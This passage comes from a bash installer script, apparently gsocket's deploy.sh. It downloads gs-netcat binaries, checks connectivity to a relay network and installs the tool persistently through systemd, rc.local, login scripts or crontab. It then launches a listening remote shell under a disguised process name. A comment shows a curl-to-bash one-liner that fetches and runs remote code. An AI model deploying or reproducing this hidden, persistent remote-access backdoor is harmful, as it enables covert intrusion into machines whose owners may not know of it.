	[[ -z "$GS_OUT" ]] && { FAIL_OUT; ERR_LOG="wrong binary"; WARN_EXECFAIL_SET "$ret" "wrong binary"; return; }

	# Use randomly generated secret unless it's set already (X=)
	[[ -z $GS_SECRET ]] && GS_SECRET="$GS_OUT"

	IS_TESTBIN_OK=1
}

test_network()
{
	unset IS_TESTNETWORK_OK

	# There should be no GS-NETCAT listening.
	# _GSOCKET_SERVER_CHECK_SEC=n makes gs-netcat try the connection.
	# 1. Exit=0 immediatly if server exists.
	# 2. Exit=202 after n seconds. Firewalled/DNS?
	# 3. Exit=203 if TCP to GSRN is refused.
	# 3. Exit=61 on GS-Connection refused. (server does not exist)
	# Do not need GS_ENV[*] here because all env variables are exported
	# when exec is used.
	err_log=$(_GSOCKET_SERVER_CHECK_SEC=10 GS_ARGS="-s ${GS_SECRET}" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
	ret=$?

	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
	[[ $ret -eq 139 ]] && { 
		ERR_LOG=""
		WARN_EXECFAIL_SET "$ret" "SIGSEGV"
		return
	}

	{ [[ $ret -eq 202 ]] || [[ $ret -eq 203 ]]; } && {
		# 202 - Timeout (alarm)
		# 203 - TCP connection refused
		FAIL_OUT
		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
		# EXIT if we can not check if SECRET has already been used.
		errexit "Cannot connect to GSRN. Firewalled?"
	}

	[[ $ret -eq 0 ]] && {
		FAIL_OUT "Secret '${GS_SECRET}' is already used."
		HOWTO_CONNECT_OUT
		exit_code 0
	}

	# Fail _unless_ it's ECONNREFUSED
	[[ $ret -eq 61 ]] && {
		# HERE: ECONNREFUSED
		# Connection to GSRN was successfull and GSRN reports
		# that no server is listening.
		# This is a good enough test that this network & binary is working.
		IS_TESTNETWORK_OK=1
		return
	}

	# Unknown error condition
	WARN_EXECFAIL_SET "$ret" "default pkg failed"
}

try_network()
{
	DEBUGF "GS_SECRET2=${GS_SECRET}"
	echo -en 2>&1 "Testing Global Socket Relay Network..................................."
	test_network
	if [[ -n "$IS_TESTNETWORK_OK" ]]; then
		OK_OUT
		return
	fi

	FAIL_OUT
	[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
	WARN_EXECFAIL
}

# try <osarch>
try()
{
	local osarch
	local src_pkg
	osarch="$1"

	src_pkg="gs-netcat_${osarch}.tar.gz"
	echo -e 2>&1 "--> Trying ${CG}${osarch}${CN}"
	# Download binaries
	echo -en 2>&1 "Downloading binaries.................................................."
	dl "gs-netcat_${osarch}.tar.gz" "${TMPDIR}/${src_pkg}"
	OK_OUT

	echo -en 2>&1 "Unpacking binaries...................................................."
	# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
	(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
	[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat" # from docker???
	[[ -n $GS_USELOCAL_GSNC ]] && {
		[[ -f "$GS_USELOCAL_GSNC" ]] || { FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"; errexit; }
		cp "${GS_USELOCAL_GSNC}" "${TMPDIR}/gs-netcat"
	}
	OK_OUT

	echo -en 2>&1 "Copying binaries......................................................"
	mv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
	chmod 700 "$DSTBIN"
	OK_OUT

	echo -en 2>&1 "Testing binaries......................................................"
	test_bin "${DSTBIN}"
	if [[ -n "$IS_TESTBIN_OK" ]]; then
		OK_OUT
		return
	fi

	rm -f "${TMPDIR}/${src_pkg}"
}

# Download the gs-netcat_any-any.tar.gz and try all of the containing
# binaries and fail hard if none could be found.
try_any()
{
	targets="x86_64-alpine i386-alpine aarch64-linux armv6l-linux x86_64-cygwin x86_64-freebsd x86_64-osx"
	for osarch in $targets; do
		[[ "$osarch" = "$OSARCH" ]] && continue # Skip the default OSARCH (already tried)
		try "$osarch"
		[[ -n "$IS_TESTBIN_OK" ]] && break
	done


	if [[ -n "$IS_TESTBIN_OK" ]]; then
		echo -e >&2 "--> ${CY}Installation did not go as smooth as it should have.${CN}"
	else
		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
	fi
}

gs_start_systemd()
{
	# HERE: It's systemd
	if [[ -z "$IS_GS_RUNNING" ]]; then
		systemctl restart "${SERVICE_HIDDEN_NAME}" &>/dev/null
		if ! systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
			FAIL_OUT "Check ${CM}systemctl start ${SERVICE_HIDDEN_NAME}${CN}."
			exit_code 255
		fi
		IS_GS_RUNNING=1
		OK_OUT
		return
	fi

	SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
}

gs_start()
{
	# If installed as systemd then try to start it
	if [[ -n "$IS_SYSTEMD" ]]; then
		gs_start_systemd
	fi
	[[ -n "$IS_GS_RUNNING" ]] && return

	# Scenario to consider:
	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-dbus'
	# ./deploy.sh -> re-installs new secret. Start gs-dbus with _new_ secret.
	# Now two gs-dbus's are running (which is correct)
	if [[ -n "$KL_CMD" ]]; then
		${KL_CMD} "${KL_CMD_RUNCHK_UARG[@]}" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
	elif command -v pidof >/dev/null; then
		# if no pkill/killall then try pidof (but we cant tell which user...)
		if pidof -qs "$BIN_HIDDEN_NAME" &>/dev/null; then
			IS_OLD_RUNNING=1
		fi
	fi
	IS_NEED_START=1

	if [[ -n "$IS_OLD_RUNNING" ]]; then
		# HERE: OLD is already running.
		if [[ -n "$IS_SKIPPED" ]]; then
			# HERE: Already running. Skipped installation (sec.dat has not changed).
			SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
			unset IS_NEED_START
		else
			# HERE: sec.dat has been updated
			OK_OUT
			WARN "More than one ${BIN_HIDDEN_NAME} is running."
			echo -e 1>&2 "----> You may want to check: ${CM}ps -elf|grep -F -- '${PROC_HIDDEN_NAME}'${CN}"
			echo -e 1>&2 "----> or terminate all     : ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${CN}"
			echo -e 1>&2 "----> or terminate the old one by logging in and typing:"
			echo -e 1>&2 "      ${CM}kill -- -\$(ps -o ppid= -p \$(ps -o ppid= -p \$\$))${CN}"
		fi
	else
		OK_OUT ""
	fi

	if [[ -n "$IS_NEED_START" ]]; then
		# We need an 'eval' here because the ENV_LINE[*] needs to be expanded
		# and then executed.
		# This wont work:
		#     FOO="X=1" && ($FOO id)  # => -bash: X=1: command not found
		# This does work:
		#     FOO="X=1" && (eval $FOO id)
		(eval "${ENV_LINE[*]}"TERM=xterm-256color GS_ARGS=\"-s "$GS_SECRET" -liD\" exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
		IS_GS_RUNNING=1
	fi
}

init_vars

[[ x"$1" =~ (clean|uninstall|clear|undo) ]] && uninstall
[[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall

init_setup

# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
[[ -n "$X" ]] && GS_SECRET_X="$X"

if [[ -z $S ]]; then
	if [[ $UID -eq 0 ]]; then
		gs_secret_reload "$SYSTEMD_SEC_FILE" 
		gs_secret_reload "$RCLOCAL_SEC_FILE" 
	fi
	gs_secret_reload "$USER_SEC_FILE"

	if [[ -n $GS_SECRET_FROM_FILE ]]; then
		GS_SECRET="${GS_SECRET_FROM_FILE}"
	else
		GS_SECRET="${GS_SECRET_X}"
	fi

	DEBUGF "GS_SECRET=$GS_SECRET"
else
	GS_SECRET="$S"
fi

try "$OSARCH"
[[ -z "$GS_OSARCH" ]] && [[ -z "$IS_TESTBIN_OK" ]] && try_any
WARN_EXECFAIL
[[ -z "$IS_TESTBIN_OK" ]] && errexit "None of the binaries worked."

[[ -z $S ]] && try_network

# [[ -n "$GS_UPDATE" ]] && gs_update

# S= is set. Do not install but connect to remote using S= as secret.
[[ -n "$S" ]] && gs_access

# -----BEGIN Install permanentally-----
# Try to install system wide. This may also start the service.
[[ -z $GS_NOINST ]] && [[ $UID -eq 0 ]] && install_system

# Try to install to user's login script or crontab (if not installed as SYSTEMD)
[[ -z $GS_NOINST ]] && [[ -z "$IS_INSTALLED" || -z "$IS_SYSTEMD" ]] && install_user

[[ -n $GS_NOINST ]] && echo -e 2>&1 "GS_NOINST is set. Skipping installation."
# -----END Install permanentally-----

if [[ -z "$IS_INSTALLED" ]]; then
	echo -e 1>&1 "--> ${CR}Access will be lost after reboot.${CN}"
fi

HOWTO_CONNECT_OUT

printf 1>&2 "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
if [[ -n "$GS_NOSTART" ]]; then
	SKIP_OUT "GS_NOSTART=1 is set."
else
	gs_start
fi

exit_code 0
